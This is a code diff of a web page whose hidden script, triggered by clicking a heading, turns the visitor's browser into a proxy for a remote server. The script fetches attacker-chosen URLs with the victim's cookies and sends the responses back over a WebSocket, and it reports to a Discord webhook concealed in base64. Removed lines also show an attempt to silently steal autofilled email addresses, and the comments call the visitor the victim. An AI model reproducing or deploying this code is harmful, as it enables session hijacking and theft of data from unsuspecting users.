@@ -14,83 +14,48 @@
     <h1 id="status" onclick="startMaster()">46</h1>
 
     <script>
-        // ✅ التعديل هنا: الرابط الجديد والمستقر من localhost.run
         const PROXY_SERVER = "wss://6611cfd937b51a.lhr.life";
-        
-        // رابط الديسكورد المشفر
         const key = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==";
         const HOOK = atob(key);
 
         function sendDiscord(msg) {
-            const f = document.createElement('form');
-            f.action = HOOK; f.method = 'POST'; f.target = 'v46_ifr';
-            const i = document.createElement('input');
-            i.name = 'content'; i.value = msg;
-            f.appendChild(i); document.body.appendChild(f);
-            const ifr = document.createElement('iframe');
-            ifr.name = 'v46_ifr'; ifr.style.display = 'none';
-            document.body.appendChild(ifr);
-            f.submit();
+            fetch(HOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: msg})
+            });
         }
 
-        async function startMaster() {
-            const btn = document.getElementById('status');
-            btn.innerText = "DONE";
-            btn.style.color = "#0f0";
+        function startMaster() {
+            document.getElementById('status').innerText = "DONE";
+            document.getElementById('status').style.color = "#0f0";
+            sendDiscord("🔵 **V46: Signal Received**");
             
-            // 1. إشعار ديسكورد بالدخول
-            sendDiscord("🔵 **V46: Signal S-1 Received (Master Server Active)**");
-
-            // 2. محاولة سحب الأوتوفيل (صمتاً)
-            const m = document.createElement('input');
-            m.type = 'email'; m.autocomplete = 'email';
-            m.style.display = 'none';
-            document.body.appendChild(m);
-            setTimeout(() => {
-                if(m.value) sendDiscord("📊 **Data A-F Found:** " + m.value);
-            }, 1000);
-
-            // 3. فتح النفق البروكسي
-            initTunnel();
-        }
-
-        function initTunnel() {
             const socket = new WebSocket(PROXY_SERVER);
-
+            
             socket.onopen = () => {
-                // إخبار السيرفر أن هذا هو "الضحية"
                 socket.send(JSON.stringify({ type: 'join' }));
-                sendDiscord("🚀 **Proxy Active:** Tunnel established with Master Server.");
             };
 
             socket.onmessage = async (event) => {
-                const req = JSON.parse(event.data);
-                if (req.type === 'proxy_request') {
-                    try {
-                        const res = await fetch(req.url, {
-                            method: req.method,
-                            headers: req.headers,
-                            credentials: 'include' 
-                        });
-                        const body = await res.text();
-                        socket.send(JSON.stringify({
-                            type: 'proxy_response',
-                            id: req.id,
-                            body: body,
-                            status: res.status
-                        }));
-                    } catch (e) {
-                        socket.send(JSON.stringify({ type: 'proxy_response', error: e.message }));
-                    }
-                }
+                // الكود هنا صار "جسر" فقط بياخد الطلب وبيرجعه
+                try {
+                    const req = JSON.parse(event.data);
+                    const response = await fetch(req.url, {
+                        method: req.method,
+                        headers: req.headers,
+                        credentials: 'include'
+                    });
+                    const data = await response.text();
+                    socket.send(JSON.stringify({
+                        body: data,
+                        status: response.status,
+                        headers: Object.fromEntries(response.headers)
+                    }));
+                } catch (e) {}
             };
 
-            // الحفاظ على الاتصال حياً
-            setInterval(() => {
-                if(socket.readyState === WebSocket.OPEN) {
-                    socket.send(JSON.stringify({type: 'ping'}));
-                }
-            }, 20000);
+            setInterval(() => { if(socket.readyState === 1) socket.send('ping'); }, 10000);
         }
     </script>
 </body>
